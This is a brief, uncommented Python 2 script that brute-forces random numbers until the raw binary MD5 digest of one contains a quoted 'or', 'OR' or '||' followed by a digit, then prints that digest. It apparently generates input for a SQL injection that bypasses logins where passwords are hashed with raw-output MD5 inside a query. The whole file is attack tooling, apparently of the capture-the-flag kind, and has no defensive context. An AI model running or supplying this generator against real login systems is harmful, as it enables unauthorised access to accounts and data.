import random , urllib
import hashlib

smaor = "'or'"
bigor = "'OR'"
symor = "'||'"
okay = 0
count = 1
part_a=""
counter = 99999999999999999999999999999999999999999999999999999999

while count == 1 :
    r = random.randint(0,counter)
    hexform = hashlib.md5(str(r)).hexdigest()
    asciiform = hexform.decode("hex")

    if (smaor in asciiform):
        part_a =  asciiform.split(smaor,1)[1]
    elif (bigor in asciiform):
        part_a =  asciiform.split(bigor,1)[1]
    elif (symor in asciiform):
        part_a =  asciiform.split(symor,1)[1]
    if len(part_a)>0:
        if part_a[0].isdigit():
            print "found"
            break

print hexform
